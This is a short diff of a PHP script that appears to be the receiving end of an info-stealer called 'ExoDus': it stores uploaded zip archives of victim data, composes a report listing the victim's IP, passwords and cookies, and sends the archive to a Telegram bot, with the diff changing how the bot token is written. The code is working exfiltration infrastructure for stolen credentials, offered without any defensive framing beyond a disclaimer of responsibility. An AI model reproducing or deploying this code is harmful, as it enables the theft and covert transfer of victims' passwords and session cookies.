@@ -16,7 +16,7 @@ $data = base64_decode("chatid");
 move_uploaded_file($_FILES['file']['tmp_name'], $_SERVER['DOCUMENT_ROOT']."/logs/ExoDus-" . $ip . $date . $time . $rnd .".zip");
 
 $desc = "<b>============NEWLOG==========</b>\n". "<b>Date</b>: " . $date . "\n<b>time</b>: " . $time . "\n<b>IP address: </b>" . $ip ."\n<b>passwords: </b>". $pass . "\n<b>cookie: </b> ".$countcu."\n<b>==========ExoDus=========</b>". "<b>\nВАЖНО\nя не несу не какую ответственность за ваши действия</b>";
-$url = "https://api.telegram.org/bot".base64_decode("token")."/sendDocument";
+$url = "https://api.telegram.org/bottoken/sendDocument";
 $document = new CURLFile($_SERVER['DOCUMENT_ROOT']."/logs/ExoDus-" . $ip . $date . $time . $rnd .".zip");
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
